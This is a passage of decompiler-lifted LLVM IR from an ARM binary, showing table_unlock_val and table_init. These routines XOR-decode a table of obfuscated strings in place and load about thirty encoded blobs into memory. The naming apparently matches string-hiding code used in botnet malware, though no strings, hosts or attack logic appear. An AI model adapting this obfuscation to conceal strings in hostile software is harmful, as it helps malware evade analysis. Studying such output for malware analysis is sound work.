  %v2_f96c = add i32 %v3_f968, ptrtoint (i32* @global_var_2421c.209 to i32)
  %v2_f970 = load i32, i32* @global_var_2156c.212, align 4
  store i32 %v2_f970, i32* @r1, align 4
  %v1_f974 = add i32 %v3_f968, add (i32 ptrtoint (i32* @global_var_2421c.209 to i32), i32 4)
  %v2_f974 = inttoptr i32 %v1_f974 to i16*
  %v3_f974 = load i16, i16* %v2_f974, align 4
  %v3_f978 = udiv i32 %v2_f970, 256
  %v2_f97c = icmp eq i16 %v3_f974, 0
  store i1 %v2_f97c, i1* @cpsr_z, align 1
  %v3_f980 = udiv i32 %v2_f970, 65536
  store i32 %v3_f980, i32* @r3, align 4
  %v3_f984 = load i32, i32* @r4, align 4
  store i32 %v3_f984, i32* %stack_var_-16, align 4
  %v1_f988 = urem i32 %v3_f978, 256
  store i32 %v1_f988, i32* %r6.global-to-local, align 4
  %v1_f98c = urem i32 %v3_f980, 256
  store i32 %v1_f98c, i32* %r5.global-to-local, align 4
  %v3_f990 = udiv i32 %v2_f970, 16777216
  store i32 %v3_f990, i32* %r4.global-to-local, align 4
  %v1_f994 = urem i32 %v2_f970, 256
  store i32 %v1_f994, i32* %lr.global-to-local, align 4
  br i1 %v2_f97c, label %dec_label_pc_f9f0, label %dec_label_pc_f99c

dec_label_pc_f99c:                                ; preds = %entry
  store i32 0, i32* @ip, align 4
  %v1_f9a0 = inttoptr i32 %v2_f96c to i32*
  br label %dec_label_pc_f9a0

dec_label_pc_f9a0:                                ; preds = %dec_label_pc_f9a0.dec_label_pc_f9a0_crit_edge, %dec_label_pc_f99c
  %v0_f9a8 = phi i32 [ %v0_f9a8.pre, %dec_label_pc_f9a0.dec_label_pc_f9a0_crit_edge ], [ %v1_f994, %dec_label_pc_f99c ]
  %v2_f9ac = phi i32 [ %v1_f9e4, %dec_label_pc_f9a0.dec_label_pc_f9a0_crit_edge ], [ 0, %dec_label_pc_f99c ]
  %v2_f9a0 = load i32, i32* %v1_f9a0, align 4
  %v2_f9a4 = add i32 %v2_f9a0, %v2_f9ac
  %v3_f9a4 = inttoptr i32 %v2_f9a4 to i8*
  %v4_f9a4 = load i8, i8* %v3_f9a4, align 1
  %v6_f9a4 = zext i8 %v4_f9a4 to i32
  %v2_f9a8 = xor i32 %v6_f9a4, %v0_f9a8
  %v1_f9ac = trunc i32 %v2_f9a8 to i8
  store i8 %v1_f9ac, i8* %v3_f9a4, align 1
  %v2_f9b0 = load i32, i32* %v1_f9a0, align 4
  %v0_f9b4 = load i32, i32* @ip, align 4
  %v2_f9b4 = add i32 %v0_f9b4, %v2_f9b0
  %v3_f9b4 = inttoptr i32 %v2_f9b4 to i8*
  %v4_f9b4 = load i8, i8* %v3_f9b4, align 1
  %v6_f9b4 = zext i8 %v4_f9b4 to i32
  %v0_f9b8 = load i32, i32* %r6.global-to-local, align 4
  %v2_f9b8 = xor i32 %v0_f9b8, %v6_f9b4
  %v1_f9bc = trunc i32 %v2_f9b8 to i8
  store i8 %v1_f9bc, i8* %v3_f9b4, align 1
  %v2_f9c0 = load i32, i32* %v1_f9a0, align 4
  %v0_f9c4 = load i32, i32* @ip, align 4
  %v2_f9c4 = add i32 %v0_f9c4, %v2_f9c0
  %v3_f9c4 = inttoptr i32 %v2_f9c4 to i8*
  %v4_f9c4 = load i8, i8* %v3_f9c4, align 1
  %v6_f9c4 = zext i8 %v4_f9c4 to i32
  %v0_f9c8 = load i32, i32* %r5.global-to-local, align 4
  %v2_f9c8 = xor i32 %v0_f9c8, %v6_f9c4
  %v1_f9cc = trunc i32 %v2_f9c8 to i8
  store i8 %v1_f9cc, i8* %v3_f9c4, align 1
  %v2_f9d0 = load i32, i32* %v1_f9a0, align 4
  store i32 %v2_f9d0, i32* @r1, align 4
  %v0_f9d4 = load i32, i32* @ip, align 4
  %v2_f9d4 = add i32 %v0_f9d4, %v2_f9d0
  %v3_f9d4 = inttoptr i32 %v2_f9d4 to i8*
  %v4_f9d4 = load i8, i8* %v3_f9d4, align 1
  %v6_f9d4 = zext i8 %v4_f9d4 to i32
  %v0_f9d8 = load i32, i32* %r4.global-to-local, align 4
  %v2_f9d8 = xor i32 %v0_f9d8, %v6_f9d4
  store i32 %v2_f9d8, i32* @r3, align 4
  %v1_f9dc = trunc i32 %v2_f9d8 to i8
  store i8 %v1_f9dc, i8* %v3_f9d4, align 1
  %v3_f9e0 = load i16, i16* %v2_f974, align 4
  %v4_f9e0 = zext i16 %v3_f9e0 to i32
  %v0_f9e4 = load i32, i32* @ip, align 4
  %v1_f9e4 = add i32 %v0_f9e4, 1
  store i32 %v1_f9e4, i32* @ip, align 4
  %v9_f9e8 = icmp eq i32 %v4_f9e0, %v1_f9e4
  store i1 %v9_f9e8, i1* @cpsr_z, align 1
  %v8_f9ec = icmp sgt i32 %v4_f9e0, %v1_f9e4
  br i1 %v8_f9ec, label %dec_label_pc_f9a0.dec_label_pc_f9a0_crit_edge, label %dec_label_pc_f9f0.loopexit

dec_label_pc_f9a0.dec_label_pc_f9a0_crit_edge:    ; preds = %dec_label_pc_f9a0
  %v0_f9a8.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_f9a0

dec_label_pc_f9f0.loopexit:                       ; preds = %dec_label_pc_f9a0
  %v2_f9f0.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_f9f0

dec_label_pc_f9f0:                                ; preds = %dec_label_pc_f9f0.loopexit, %entry
  %v2_f9f0 = phi i32 [ %v2_f9f0.pre, %dec_label_pc_f9f0.loopexit ], [ %v3_f984, %entry ]
  store i32 %v2_f9f0, i32* @r4, align 4
  ret i32 %v2_f96c

; uselistorder directives
  uselistorder i32 %v1_f9e4, { 1, 2, 3, 0 }
  uselistorder i32 %v1_f994, { 1, 0 }
  uselistorder i32 %v3_f980, { 1, 0 }
  uselistorder i32 %v2_f970, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v3_f968, { 1, 0 }
}

define i32 @table_unlock_val(i32 %arg1) local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_fa08 = mul i32 %arg1, 8
  %v2_fa0c = add i32 %v3_fa08, ptrtoint (i32* @global_var_2421c.209 to i32)
  %v2_fa10 = load i32, i32* @global_var_2156c.212, align 4
  %v1_fa14 = add i32 %v3_fa08, add (i32 ptrtoint (i32* @global_var_2421c.209 to i32), i32 4)
  %v2_fa14 = inttoptr i32 %v1_fa14 to i16*
  %v3_fa14 = load i16, i16* %v2_fa14, align 4
  %v3_fa18 = udiv i32 %v2_fa10, 256
  %v2_fa1c = icmp eq i16 %v3_fa14, 0
  %v3_fa20 = udiv i32 %v2_fa10, 65536
  %v3_fa24 = load i32, i32* @r4, align 4
  store i32 %v3_fa24, i32* %stack_var_-16, align 4
  %v1_fa28 = urem i32 %v3_fa18, 256
  store i32 %v1_fa28, i32* %r6.global-to-local, align 4
  %v1_fa2c = urem i32 %v3_fa20, 256
  store i32 %v1_fa2c, i32* %r5.global-to-local, align 4
  %v3_fa30 = udiv i32 %v2_fa10, 16777216
  store i32 %v3_fa30, i32* %r4.global-to-local, align 4
  %v1_fa34 = urem i32 %v2_fa10, 256
  store i32 %v1_fa34, i32* %lr.global-to-local, align 4
  br i1 %v2_fa1c, label %dec_label_pc_fa90, label %dec_label_pc_fa3c

dec_label_pc_fa3c:                                ; preds = %entry
  store i32 0, i32* @ip, align 4
  %v1_fa40 = inttoptr i32 %v2_fa0c to i32*
  br label %dec_label_pc_fa40

dec_label_pc_fa40:                                ; preds = %dec_label_pc_fa40.dec_label_pc_fa40_crit_edge, %dec_label_pc_fa3c
  %v0_fa48 = phi i32 [ %v0_fa48.pre, %dec_label_pc_fa40.dec_label_pc_fa40_crit_edge ], [ %v1_fa34, %dec_label_pc_fa3c ]
  %v2_fa4c = phi i32 [ %v1_fa84, %dec_label_pc_fa40.dec_label_pc_fa40_crit_edge ], [ 0, %dec_label_pc_fa3c ]
  %v2_fa40 = load i32, i32* %v1_fa40, align 4
  %v2_fa44 = add i32 %v2_fa40, %v2_fa4c
  %v3_fa44 = inttoptr i32 %v2_fa44 to i8*
  %v4_fa44 = load i8, i8* %v3_fa44, align 1
  %v6_fa44 = zext i8 %v4_fa44 to i32
  %v2_fa48 = xor i32 %v6_fa44, %v0_fa48
  %v1_fa4c = trunc i32 %v2_fa48 to i8
  store i8 %v1_fa4c, i8* %v3_fa44, align 1
  %v2_fa50 = load i32, i32* %v1_fa40, align 4
  %v0_fa54 = load i32, i32* @ip, align 4
  %v2_fa54 = add i32 %v0_fa54, %v2_fa50
  %v3_fa54 = inttoptr i32 %v2_fa54 to i8*
  %v4_fa54 = load i8, i8* %v3_fa54, align 1
  %v6_fa54 = zext i8 %v4_fa54 to i32
  %v0_fa58 = load i32, i32* %r6.global-to-local, align 4
  %v2_fa58 = xor i32 %v0_fa58, %v6_fa54
  %v1_fa5c = trunc i32 %v2_fa58 to i8
  store i8 %v1_fa5c, i8* %v3_fa54, align 1
  %v2_fa60 = load i32, i32* %v1_fa40, align 4
  %v0_fa64 = load i32, i32* @ip, align 4
  %v2_fa64 = add i32 %v0_fa64, %v2_fa60
  %v3_fa64 = inttoptr i32 %v2_fa64 to i8*
  %v4_fa64 = load i8, i8* %v3_fa64, align 1
  %v6_fa64 = zext i8 %v4_fa64 to i32
  %v0_fa68 = load i32, i32* %r5.global-to-local, align 4
  %v2_fa68 = xor i32 %v0_fa68, %v6_fa64
  %v1_fa6c = trunc i32 %v2_fa68 to i8
  store i8 %v1_fa6c, i8* %v3_fa64, align 1
  %v2_fa70 = load i32, i32* %v1_fa40, align 4
  %v0_fa74 = load i32, i32* @ip, align 4
  %v2_fa74 = add i32 %v0_fa74, %v2_fa70
  %v3_fa74 = inttoptr i32 %v2_fa74 to i8*
  %v4_fa74 = load i8, i8* %v3_fa74, align 1
  %v6_fa74 = zext i8 %v4_fa74 to i32
  %v0_fa78 = load i32, i32* %r4.global-to-local, align 4
  %v2_fa78 = xor i32 %v0_fa78, %v6_fa74
  %v1_fa7c = trunc i32 %v2_fa78 to i8
  store i8 %v1_fa7c, i8* %v3_fa74, align 1
  %v3_fa80 = load i16, i16* %v2_fa14, align 4
  %v4_fa80 = zext i16 %v3_fa80 to i32
  %v0_fa84 = load i32, i32* @ip, align 4
  %v1_fa84 = add i32 %v0_fa84, 1
  store i32 %v1_fa84, i32* @ip, align 4
  %v8_fa8c = icmp sgt i32 %v4_fa80, %v1_fa84
  br i1 %v8_fa8c, label %dec_label_pc_fa40.dec_label_pc_fa40_crit_edge, label %dec_label_pc_fa90.loopexit

dec_label_pc_fa40.dec_label_pc_fa40_crit_edge:    ; preds = %dec_label_pc_fa40
  %v0_fa48.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_fa40

dec_label_pc_fa90.loopexit:                       ; preds = %dec_label_pc_fa40
  %v2_fa90.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_fa90

dec_label_pc_fa90:                                ; preds = %dec_label_pc_fa90.loopexit, %entry
  %v2_fa90 = phi i32 [ %v2_fa90.pre, %dec_label_pc_fa90.loopexit ], [ %v3_fa24, %entry ]
  store i32 %v2_fa90, i32* @r4, align 4
  ret i32 %v2_fa0c

; uselistorder directives
  uselistorder i32 %v1_fa84, { 1, 2, 0 }
  uselistorder i32 %v1_fa34, { 1, 0 }
  uselistorder i32 %v2_fa10, { 3, 0, 1, 2 }
  uselistorder i32 %v2_fa0c, { 1, 0 }
  uselistorder i32 %v3_fa08, { 1, 0 }
}

define i32 @table_init(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v9_faa0 = load i32, i32* @r6, align 4
  %v12_faa0 = load i32, i32* @r7, align 4
  %v15_faa0 = load i32, i32* @r8, align 4
  %v21_faa0 = load i32, i32* @sl, align 4
  %v24_faa0 = load i32, i32* @fp, align 4
  store i32 2, i32* @r0, align 4
  %v0_faac = call i32 @malloc()
  store i32 2, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_2421c.209 to i32), i32* @r4, align 4
  store i32 %v0_faac, i32* @r6, align 4
  %v3_fac4 = call i32 @util_memcpy(i32 %v0_faac, i32 ptrtoint (i32* @global_var_18e20.217 to i32), i32 2)
  %v0_fac8 = load i32, i32* @r5, align 4
  store i32 %v0_fac8, i32* @r0, align 4
  %v0_facc = load i32, i32* @r6, align 4
  store i32 %v0_facc, i32* @global_var_24224.218, align 4
  %v1_fad0 = trunc i32 %v0_fac8 to i16
  store i16 %v1_fad0, i16* bitcast (i32* @global_var_24228.219 to i16*), align 4
  %v0_fad4 = call i32 @malloc()
  %v0_fad8 = load i32, i32* @r5, align 4
  store i32 %v0_fad4, i32* @r6, align 4
  %v3_fae4 = call i32 @util_memcpy(i32 %v0_fad4, i32 ptrtoint (i32* @global_var_18e24.221 to i32), i32 %v0_fad8)
  store i32 29, i32* @r0, align 4
  %v0_faec = load i32, i32* @r6, align 4
  store i32 %v0_faec, i32* @global_var_2422c.222, align 4
  %v0_faf0 = load i32, i32* @r5, align 4
  %v1_faf0 = trunc i32 %v0_faf0 to i16
  store i16 %v1_faf0, i16* bitcast (i32* @global_var_24230.223 to i16*), align 4
  %v0_faf4 = call i32 @malloc()
  store i32 %v0_faf4, i32* @r5, align 4
  %v3_fb04 = call i32 @util_memcpy(i32 %v0_faf4, i32 ptrtoint (i32* @global_var_18f8c.225 to i32), i32 29)
  store i32 6, i32* @r0, align 4
  store i16 29, i16* bitcast (i32* @global_var_24238.226 to i16*), align 4
  %v0_fb14 = load i32, i32* @r5, align 4
  store i32 %v0_fb14, i32* @global_var_24234.227, align 4
  %v0_fb18 = call i32 @malloc()
  store i32 6, i32* @sb, align 4
  store i32 %v0_fb18, i32* @r5, align 4
  %v4_fb2c = call i32 @util_memcpy(i32 %v0_fb18, i32 ptrtoint ([7 x i8]* @global_var_18e28.229 to i32), i32 6)
  store i32 7, i32* @r0, align 4
  store i32 7, i32* @r7, align 4
  %v0_fb38 = load i32, i32* @r5, align 4
  store i32 %v0_fb38, i32* @global_var_2423c.230, align 4
  %v0_fb3c = load i32, i32* @sb, align 4
  %v1_fb3c = trunc i32 %v0_fb3c to i16
  store i16 %v1_fb3c, i16* bitcast (i32* @global_var_24240.231 to i16*), align 4
  %v0_fb40 = call i32 @malloc()
  %v0_fb48 = load i32, i32* @r7, align 4
  store i32 %v0_fb40, i32* @r5, align 4
  %v4_fb50 = call i32 @util_memcpy(i32 %v0_fb40, i32 ptrtoint ([8 x i8]* @global_var_18e30.233 to i32), i32 %v0_fb48)
  %v0_fb54 = load i32, i32* @r7, align 4
  store i32 %v0_fb54, i32* @r0, align 4
  %v0_fb58 = load i32, i32* @r5, align 4
  store i32 %v0_fb58, i32* @global_var_24244.234, align 4
  %v1_fb5c = trunc i32 %v0_fb54 to i16
  store i16 %v1_fb5c, i16* bitcast (i32* @global_var_24248.235 to i16*), align 4
  %v0_fb60 = call i32 @malloc()
  %v0_fb68 = load i32, i32* @r7, align 4
  store i32 %v0_fb60, i32* @r5, align 4
  %v4_fb70 = call i32 @util_memcpy(i32 %v0_fb60, i32 ptrtoint ([8 x i8]* @global_var_18e38.237 to i32), i32 %v0_fb68)
  store i32 3, i32* @r0, align 4
  %v0_fb78 = load i32, i32* @r5, align 4
  store i32 %v0_fb78, i32* @global_var_2424c.238, align 4
  %v0_fb7c = load i32, i32* @r7, align 4
  %v1_fb7c = trunc i32 %v0_fb7c to i16
  store i16 %v1_fb7c, i16* bitcast (i32* @global_var_24250.239 to i16*), align 4
  %v0_fb80 = call i32 @malloc()
  store i32 %v0_fb80, i32* @r5, align 4
  %v4_fb90 = call i32 @util_memcpy(i32 %v0_fb80, i32 ptrtoint ([4 x i8]* @global_var_18e40.241 to i32), i32 3)
  store i32 19, i32* @r0, align 4
  store i16 3, i16* bitcast (i32* @global_var_24258.242 to i16*), align 4
  %v0_fba0 = load i32, i32* @r5, align 4
  store i32 %v0_fba0, i32* @global_var_24254.243, align 4
  %v0_fba4 = call i32 @malloc()
  store i32 %v0_fba4, i32* @r5, align 4
  %v3_fbb4 = call i32 @util_memcpy(i32 %v0_fba4, i32 ptrtoint (i32* @global_var_18e44.245 to i32), i32 19)
  store i32 24, i32* @r0, align 4
  store i16 19, i16* bitcast (i32* @global_var_24260.246 to i16*), align 4
  %v0_fbc4 = load i32, i32* @r5, align 4
  store i32 %v0_fbc4, i32* @global_var_2425c.247, align 4
  %v0_fbc8 = call i32 @malloc()
  store i32 %v0_fbc8, i32* @r5, align 4
  %v3_fbd8 = call i32 @util_memcpy(i32 %v0_fbc8, i32 ptrtoint (i32* @global_var_18e58.249 to i32), i32 24)
  store i32 9, i32* @r0, align 4
  store i16 24, i16* bitcast (i32* @global_var_24268.250 to i16*), align 4
  %v0_fbe8 = load i32, i32* @r5, align 4
  store i32 %v0_fbe8, i32* @global_var_24264.251, align 4
  %v0_fbec = call i32 @malloc()
  store i32 %v0_fbec, i32* @r5, align 4
  %v4_fbfc = call i32 @util_memcpy(i32 %v0_fbec, i32 ptrtoint ([10 x i8]* @global_var_18e74.253 to i32), i32 9)
  store i32 16, i32* @r0, align 4
  store i16 9, i16* bitcast (i32* @global_var_24270.254 to i16*), align 4
  %v0_fc0c = load i32, i32* @r5, align 4
  store i32 %v0_fc0c, i32* @global_var_2426c.255, align 4
  %v0_fc10 = call i32 @malloc()
  store i32 %v0_fc10, i32* @r5, align 4
  store i32 16, i32* @sl, align 4
  %v4_fc24 = call i32 @util_memcpy(i32 %v0_fc10, i32 ptrtoint ([17 x i8]* @global_var_18e80.257 to i32), i32 16)
  store i32 22, i32* @r0, align 4
  %v0_fc2c = load i32, i32* @r5, align 4
  store i32 %v0_fc2c, i32* @global_var_24274.258, align 4
  %v0_fc30 = load i32, i32* @sl, align 4
  %v1_fc30 = trunc i32 %v0_fc30 to i16
  store i16 %v1_fc30, i16* bitcast (i32* @global_var_24278.259 to i16*), align 4
  %v0_fc34 = call i32 @malloc()
  store i32 %v0_fc34, i32* @r5, align 4
  %v4_fc44 = call i32 @util_memcpy(i32 %v0_fc34, i32 ptrtoint ([23 x i8]* @global_var_18e94.261 to i32), i32 22)
  %v0_fc4c = load i32, i32* @r7, align 4
  store i32 %v0_fc4c, i32* @r0, align 4
  store i16 22, i16* bitcast (i32* @global_var_24280.262 to i16*), align 4
  %v0_fc54 = load i32, i32* @r5, align 4
  store i32 %v0_fc54, i32* @global_var_2427c.263, align 4
  %v0_fc58 = call i32 @malloc()
  %v0_fc60 = load i32, i32* @r7, align 4
  store i32 %v0_fc58, i32* @r5, align 4
  %v4_fc68 = call i32 @util_memcpy(i32 %v0_fc58, i32 ptrtoint ([8 x i8]* @global_var_18eac.265 to i32), i32 %v0_fc60)
  store i32 5, i32* @r0, align 4
  %v0_fc70 = load i32, i32* @r5, align 4
  store i32 %v0_fc70, i32* @global_var_24284.266, align 4
  %v0_fc74 = load i32, i32* @r7, align 4
  %v1_fc74 = trunc i32 %v0_fc74 to i16
  store i16 %v1_fc74, i16* bitcast (i32* @global_var_24288.267 to i16*), align 4
  %v0_fc78 = call i32 @malloc()
  store i32 %v0_fc78, i32* @r5, align 4
  store i32 5, i32* @fp, align 4
  %v4_fc8c = call i32 @util_memcpy(i32 %v0_fc78, i32 ptrtoint ([6 x i8]* @global_var_18eb4.269 to i32), i32 5)
  store i32 4, i32* @r0, align 4
  %v0_fc94 = load i32, i32* @r5, align 4
  store i32 %v0_fc94, i32* @global_var_2428c.270, align 4
  %v0_fc98 = load i32, i32* @fp, align 4
  %v1_fc98 = trunc i32 %v0_fc98 to i16
  store i16 %v1_fc98, i16* bitcast (i32* @global_var_24290.271 to i16*), align 4
  %v0_fc9c = call i32 @malloc()
  store i32 %v0_fc9c, i32* @r5, align 4
  %v4_fcac = call i32 @util_memcpy(i32 %v0_fc9c, i32 ptrtoint ([5 x i8]* @global_var_18ebc.272 to i32), i32 4)
  %v0_fcb4 = load i32, i32* @sb, align 4
  store i32 %v0_fcb4, i32* @r0, align 4
  store i16 4, i16* bitcast (i32* @global_var_24298.273 to i16*), align 4
  %v0_fcbc = load i32, i32* @r5, align 4
  store i32 %v0_fcbc, i32* @global_var_24294.274, align 4
  %v0_fcc0 = call i32 @malloc()
  %v0_fcc8 = load i32, i32* @sb, align 4
  store i32 %v0_fcc0, i32* @r5, align 4
  %v4_fcd0 = call i32 @util_memcpy(i32 %v0_fcc0, i32 ptrtoint ([7 x i8]* @global_var_18ec4.276 to i32), i32 %v0_fcc8)
  store i32 14, i32* @r0, align 4
  %v0_fcd8 = load i32, i32* @r5, align 4
  store i32 %v0_fcd8, i32* @global_var_2429c.277, align 4
  %v0_fcdc = load i32, i32* @sb, align 4
  %v1_fcdc = trunc i32 %v0_fcdc to i16
  store i16 %v1_fcdc, i16* bitcast (i32* @global_var_242a0.278 to i16*), align 4
  %v0_fce0 = call i32 @malloc()
  store i32 %v0_fce0, i32* @r5, align 4
  store i32 14, i32* @r8, align 4
  %v4_fcf4 = call i32 @util_memcpy(i32 %v0_fce0, i32 ptrtoint ([15 x i8]* @global_var_18ecc.280 to i32), i32 14)
  store i32 8, i32* @r0, align 4
  %v0_fcfc = load i32, i32* @r5, align 4
  store i32 %v0_fcfc, i32* @global_var_242a4.281, align 4
  %v0_fd00 = load i32, i32* @r8, align 4
  %v1_fd00 = trunc i32 %v0_fd00 to i16
  store i16 %v1_fd00, i16* bitcast (i32* @global_var_242a8.282 to i16*), align 4
  %v0_fd04 = call i32 @malloc()
  store i32 8, i32* @r6, align 4
  store i32 %v0_fd04, i32* @r5, align 4
  %v4_fd18 = call i32 @util_memcpy(i32 %v0_fd04, i32 ptrtoint ([9 x i8]* @global_var_18edc.284 to i32), i32 8)
  %v0_fd1c = load i32, i32* @r7, align 4
  store i32 %v0_fd1c, i32* @r0, align 4
  %v0_fd20 = load i32, i32* @r5, align 4
  store i32 %v0_fd20, i32* @global_var_24304.285, align 4
  %v0_fd24 = load i32, i32* @r6, align 4
  %v1_fd24 = trunc i32 %v0_fd24 to i16
  store i16 %v1_fd24, i16* bitcast (i32* @global_var_24308.286 to i16*), align 4
  %v0_fd28 = call i32 @malloc()
  %v0_fd30 = load i32, i32* @r7, align 4
  store i32 %v0_fd28, i32* @r5, align 4
  %v4_fd38 = call i32 @util_memcpy(i32 %v0_fd28, i32 ptrtoint ([8 x i8]* @global_var_18ee8.288 to i32), i32 %v0_fd30)
  %v0_fd3c = load i32, i32* @sl, align 4
  store i32 %v0_fd3c, i32* @r0, align 4
  %v0_fd40 = load i32, i32* @r5, align 4
  store i32 %v0_fd40, i32* @global_var_2430c.289, align 4
  %v0_fd44 = load i32, i32* @r7, align 4
  %v1_fd44 = trunc i32 %v0_fd44 to i16
  store i16 %v1_fd44, i16* bitcast (i32* @global_var_24310.290 to i16*), align 4
  %v0_fd48 = call i32 @malloc()
  %v0_fd50 = load i32, i32* @sl, align 4
  store i32 %v0_fd48, i32* @r5, align 4
  %v4_fd58 = call i32 @util_memcpy(i32 %v0_fd48, i32 ptrtoint ([17 x i8]* @global_var_18ef0.292 to i32), i32 %v0_fd50)
  %v0_fd5c = load i32, i32* @r6, align 4
  store i32 %v0_fd5c, i32* @r0, align 4
  %v0_fd60 = load i32, i32* @r5, align 4
  store i32 %v0_fd60, i32* @global_var_242ac.293, align 4
  %v0_fd64 = load i32, i32* @sl, align 4
  %v1_fd64 = trunc i32 %v0_fd64 to i16
  store i16 %v1_fd64, i16* bitcast (i32* @global_var_242b0.294 to i16*), align 4
  %v0_fd68 = call i32 @malloc()
  %v0_fd70 = load i32, i32* @r6, align 4
  store i32 %v0_fd68, i32* @r5, align 4
  %v4_fd78 = call i32 @util_memcpy(i32 %v0_fd68, i32 ptrtoint ([9 x i8]* @global_var_18f04.296 to i32), i32 %v0_fd70)
  store i32 21, i32* @r0, align 4
  %v0_fd80 = load i32, i32* @r5, align 4
  store i32 %v0_fd80, i32* @global_var_242b4.297, align 4
  %v0_fd84 = load i32, i32* @r6, align 4
  %v1_fd84 = trunc i32 %v0_fd84 to i16
  store i16 %v1_fd84, i16* bitcast (i32* @global_var_242b8.298 to i16*), align 4
  %v0_fd88 = call i32 @malloc()
  store i32 %v0_fd88, i32* @r5, align 4
  %v3_fd98 = call i32 @util_memcpy(i32 %v0_fd88, i32 ptrtoint (i32* @global_var_18fac.300 to i32), i32 21)
  store i32 17, i32* @r0, align 4
  store i16 21, i16* bitcast (i32* @global_var_242c0.301 to i16*), align 4
  %v0_fda8 = load i32, i32* @r5, align 4
  store i32 %v0_fda8, i32* @global_var_242bc.302, align 4
  %v0_fdac = call i32 @malloc()
  store i32 %v0_fdac, i32* @r5, align 4
  %v4_fdbc = call i32 @util_memcpy(i32 %v0_fdac, i32 ptrtoint ([18 x i8]* @global_var_18f10.304 to i32), i32 17)
  store i32 12, i32* @r0, align 4
  store i16 17, i16* bitcast (i32* @global_var_242c8.305 to i16*), align 4
  %v0_fdcc = load i32, i32* @r5, align 4
  store i32 %v0_fdcc, i32* @global_var_242c4.306, align 4
  %v0_fdd0 = call i32 @malloc()
  store i32 %v0_fdd0, i32* @r5, align 4
  %v4_fde0 = call i32 @util_memcpy(i32 %v0_fdd0, i32 ptrtoint ([13 x i8]* @global_var_18f24.308 to i32), i32 12)
  %v0_fde8 = load i32, i32* @r8, align 4
  store i32 %v0_fde8, i32* @r0, align 4
  store i16 12, i16* bitcast (i32* @global_var_242d0.309 to i16*), align 4
  %v0_fdf0 = load i32, i32* @r5, align 4
  store i32 %v0_fdf0, i32* @global_var_242cc.310, align 4
  %v0_fdf4 = call i32 @malloc()
  %v0_fdfc = load i32, i32* @r8, align 4
  store i32 %v0_fdf4, i32* @r5, align 4
  %v4_fe04 = call i32 @util_memcpy(i32 %v0_fdf4, i32 ptrtoint ([15 x i8]* @global_var_18f34.312 to i32), i32 %v0_fdfc)
  store i32 19, i32* @r0, align 4
  %v0_fe0c = load i32, i32* @r5, align 4
  store i32 %v0_fe0c, i32* @global_var_242d4.313, align 4
  %v0_fe10 = load i32, i32* @r8, align 4
  %v1_fe10 = trunc i32 %v0_fe10 to i16
  store i16 %v1_fe10, i16* bitcast (i32* @global_var_242d8.314 to i16*), align 4
  %v0_fe14 = call i32 @malloc()
  store i32 %v0_fe14, i32* @r5, align 4
  %v4_fe24 = call i32 @util_memcpy(i32 %v0_fe14, i32 ptrtoint ([20 x i8]* @global_var_18f44.316 to i32), i32 19)
  %v0_fe2c = load i32, i32* @r6, align 4
  store i32 %v0_fe2c, i32* @r0, align 4
  store i16 19, i16* bitcast (i32* @global_var_242e0.317 to i16*), align 4
  %v0_fe34 = load i32, i32* @r5, align 4
  store i32 %v0_fe34, i32* @global_var_242dc.318, align 4
  %v0_fe38 = call i32 @malloc()
  %v0_fe40 = load i32, i32* @r6, align 4
  store i32 %v0_fe38, i32* @r5, align 4
  %v4_fe48 = call i32 @util_memcpy(i32 %v0_fe38, i32 ptrtoint ([9 x i8]* @global_var_18f58.320 to i32), i32 %v0_fe40)
  %v0_fe4c = load i32, i32* @fp, align 4
  store i32 %v0_fe4c, i32* @r0, align 4
  %v0_fe50 = load i32, i32* @r5, align 4
  store i32 %v0_fe50, i32* @global_var_242e4.321, align 4
  %v0_fe54 = load i32, i32* @r6, align 4
  %v1_fe54 = trunc i32 %v0_fe54 to i16
  store i16 %v1_fe54, i16* bitcast (i32* @global_var_242e8.322 to i16*), align 4
  %v0_fe58 = call i32 @malloc()
  %v0_fe60 = load i32, i32* @fp, align 4
  store i32 %v0_fe58, i32* @r5, align 4
  %v4_fe68 = call i32 @util_memcpy(i32 %v0_fe58, i32 ptrtoint ([6 x i8]* @global_var_18f64.324 to i32), i32 %v0_fe60)
  %v0_fe6c = load i32, i32* @sb, align 4
  store i32 %v0_fe6c, i32* @r0, align 4
  %v0_fe70 = load i32, i32* @r5, align 4
  store i32 %v0_fe70, i32* @global_var_242ec.325, align 4
  %v0_fe74 = load i32, i32* @fp, align 4
  %v1_fe74 = trunc i32 %v0_fe74 to i16
  store i16 %v1_fe74, i16* bitcast (i32* @global_var_242f0.326 to i16*), align 4
  %v0_fe78 = call i32 @malloc()
  %v0_fe80 = load i32, i32* @sb, align 4
  store i32 %v0_fe78, i32* @r5, align 4
  %v4_fe88 = call i32 @util_memcpy(i32 %v0_fe78, i32 ptrtoint ([7 x i8]* @global_var_18f6c.328 to i32), i32 %v0_fe80)
  store i32 23, i32* @r0, align 4
  %v0_fe90 = load i32, i32* @r5, align 4
  store i32 %v0_fe90, i32* @global_var_242f4.329, align 4
  %v0_fe94 = load i32, i32* @sb, align 4
  %v1_fe94 = trunc i32 %v0_fe94 to i16
  store i16 %v1_fe94, i16* bitcast (i32* @global_var_242f8.330 to i16*), align 4
  %v0_fe98 = call i32 @malloc()
  %v4_fea8 = call i32 @util_memcpy(i32 %v0_fe98, i32 ptrtoint ([24 x i8]* @global_var_18f74.332 to i32), i32 23)
  store i32 %v0_fe98, i32* @global_var_242fc.333, align 4
  store i16 23, i16* bitcast (i32* @global_var_24300.334 to i16*), align 4
  store i32 %v9_faa0, i32* @r6, align 4
  store i32 %v12_faa0, i32* @r7, align 4
  store i32 %v15_faa0, i32* @r8, align 4
  store i32 %v21_faa0, i32* @sl, align 4
  store i32 %v24_faa0, i32* @fp, align 4
  ret i32 %v4_fea8

; uselistorder directives
  uselistorder i32 %v0_fe78, { 1, 0 }
  uselistorder i32 %v0_fe58, { 1, 0 }
  uselistorder i32 %v0_fe38, { 1, 0 }
  uselistorder i32 %v0_fdf4, { 1, 0 }
